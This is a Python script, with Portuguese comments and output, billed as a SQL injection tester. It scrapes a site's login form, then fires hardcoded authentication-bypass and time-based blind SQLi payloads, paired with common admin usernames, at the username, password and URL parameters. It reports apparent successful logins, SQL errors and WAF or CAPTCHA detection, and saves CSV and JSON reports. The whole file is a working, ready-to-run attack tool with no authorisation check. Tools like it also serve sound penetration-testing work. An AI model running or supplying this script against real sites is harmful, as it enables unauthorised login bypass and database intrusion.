"""
SQL Injection Tester
Made by: Lucas Navarro
"""

import requests
from bs4 import BeautifulSoup
import time
import csv
import json
import re
from urllib.parse import urljoin, urlparse, parse_qs
from datetime import datetime

# Lista de payloads para SQL Injection normais e blind
payloads = [
    # Comuns
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR '1'='1' --",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin' --",
    "' OR '1'='1' /*",
    "\" OR \"\"=\"",
    "' OR ''='",
    
    # Blind
    "' AND SLEEP(5)--",
    "' AND 1=1--",
    "' AND 1=2--",
    "' OR EXISTS(SELECT * FROM users)--"
]

base_usernames = [
    "admin", "admin1", "root", "test", "test1", "user", "usuario",
    "admin123", "teste", "adm", "lucas", "navarro", "admin2024"
]

# Gera variações de case
usernames = []
for user in base_usernames:
    usernames.extend([user.lower(), user.upper(), user.capitalize()])

# Palavras que indicam login bem-sucedido
success_keywords = ["painel", "dashboard", "logout", "admin", "bem-vindo"]

# Palavras que indicam erro SQL
error_keywords = ["sql", "syntax", "mysql", "warning", "error"]

# Palavras que indicam WAF ou CAPTCHA
waf_keywords = ["captcha", "cloudflare", "verifique", "protegido", "segurança"]

def blue(text): return f"\033[34m{text}\033[0m"
def green(text): return f"\033[32m{text}\033[0m"
def red(text): return f"\033[31m{text}\033[0m"

def extract_form_fields(html):
    soup = BeautifulSoup(html, 'html.parser')
    form = soup.find('form')
    if not form:
        return None, None, None, None, None

    action = form.get('action')
    method = form.get('method', 'post').lower()
    inputs = form.find_all('input')
    fields = {}
    user_field = pass_field = None

    for input_tag in inputs:
        name = input_tag.get('name')
        t = input_tag.get('type', 'text')
        if not name:
            continue
        if t in ['text', 'email'] and not user_field:
            user_field = name
        elif t == 'password' and not pass_field:
            pass_field = name
        fields[name] = input_tag.get('value', '')

    return action, method, fields, user_field, pass_field

def test_sqli(url):
    session = requests.Session()
    print(blue("[+] Acessando página de login..."))
    resp = session.get(url)

    action, method, fields, user_field, pass_field = extract_form_fields(resp.text)
    if not all([action, user_field, pass_field]):
        print(red("[!] Formulário não identificado corretamente."))
        return

    login_url = action if action.startswith('http') else urljoin(url, action)
    print(blue(f"[+] URL do login detectada: {login_url}"))

    resultados = []
    print(blue("\n[*] Iniciando testes com payloads...\n"))

    for user in usernames:
        for payload in payloads:
            for campo_alvo in [user_field, pass_field]:
                data = fields.copy()
                data[user_field] = user
                data[pass_field] = user  # Valor padrão caso não seja o campo alvo
                data[campo_alvo] = payload
                inicio = time.time()
                try:
                    if method == 'post':
                        r = session.post(login_url, data=data)
                    else:
                        r = session.get(login_url, params=data)
                    duracao = round(time.time() - inicio, 2)
                    conteudo = r.text.lower()

                    sucesso = any(k in conteudo for k in success_keywords) or r.url != login_url
                    erro_sql = any(k in conteudo for k in error_keywords)
                    waf = any(k in conteudo for k in waf_keywords)
                    blind = duracao >= 4.5

                    status = []
                    if sucesso:
                        status.append("Login bem-sucedido")
                    if erro_sql:
                        status.append("Erro SQL detectado")
                    if blind:
                        status.append("Resposta lenta (possível blind)")
                    if waf:
                        status.append("WAF/CAPTCHA detectado")
                    if not status:
                        status.append("Sem resposta suspeita")

                    print(green(f"Usuário: {user} | Campo: {campo_alvo} | Payload: {payload} | Tempo: {duracao}s → {', '.join(status)}"))

                    resultados.append({
                        "usuario": user,
                        "campo": campo_alvo,
                        "payload": payload,
                        "tempo": duracao,
                        "status": status
                    })
                except Exception as e:
                    print(red(f"[!] Erro: {e}"))

    # Testar payloads na URL (query string)
    print(blue("\n[*] Testando payloads em parâmetros da URL...\n"))
    parsed_url = urlparse(url)
    qs = parse_qs(parsed_url.query)
    for param in qs:
        for payload in payloads:
            new_qs = qs.copy()
            new_qs[param] = payload
            query_string = "&".join(f"{k}={v}" for k, v in new_qs.items())
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query_string}"
            inicio = time.time()
            r = session.get(test_url)
            duracao = round(time.time() - inicio, 2)
            conteudo = r.text.lower()

            sucesso = any(k in conteudo for k in success_keywords)
            erro_sql = any(k in conteudo for k in error_keywords)
            waf = any(k in conteudo for k in waf_keywords)
            blind = duracao >= 4.5

            status = []
            if sucesso:
                status.append("Login bem-sucedido")
            if erro_sql:
                status.append("Erro SQL detectado")
            if blind:
                status.append("Resposta lenta (possível blind)")
            if waf:
                status.append("WAF/CAPTCHA detectado")
            if not status:
                status.append("Sem resposta suspeita")

            print(green(f"Parâmetro: {param} | Payload: {payload} | Tempo: {duracao}s → {', '.join(status)}"))
            resultados.append({
                "usuario": "(param url)",
                "campo": param,
                "payload": payload,
                "tempo": duracao,
                "status": status
            })

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    with open(f"relatorio_{timestamp}.csv", "w", newline='', encoding='utf-8') as csvfile:
        writer = csv.DictWriter(csvfile, fieldnames=["usuario", "campo", "payload", "tempo", "status"])
        writer.writeheader()
        for linha in resultados:
            linha["status"] = ", ".join(linha["status"])
            writer.writerow(linha)

    with open(f"relatorio_{timestamp}.json", "w", encoding='utf-8') as jsonfile:
        json.dump(resultados, jsonfile, indent=2, ensure_ascii=False)

    print(blue(f"\n[✓] Testes finalizados. Relatórios salvos como relatorio_{timestamp}.csv e .json"))

def main():
    print(blue("""
   ____  _____ _     ___        _                
  / ___|| ____| |   |_ _|_ __  | |_ ___ _ __ ___ 
  \___ \|  _| | |    | || '_ \ | __/ _ \ '__/ __|
   ___) | |___| |___ | || | | || ||  __/ |  \__ \\
  |____/|_____|_____|___|_| |_| \__\___|_|  |___/

             SQLi Tester - Made by: Lucas Navarro
    """))
    url = input(blue("Insira a URL da página de login: ")).strip()
    test_sqli(url)

if __name__ == '__main__':
    main()
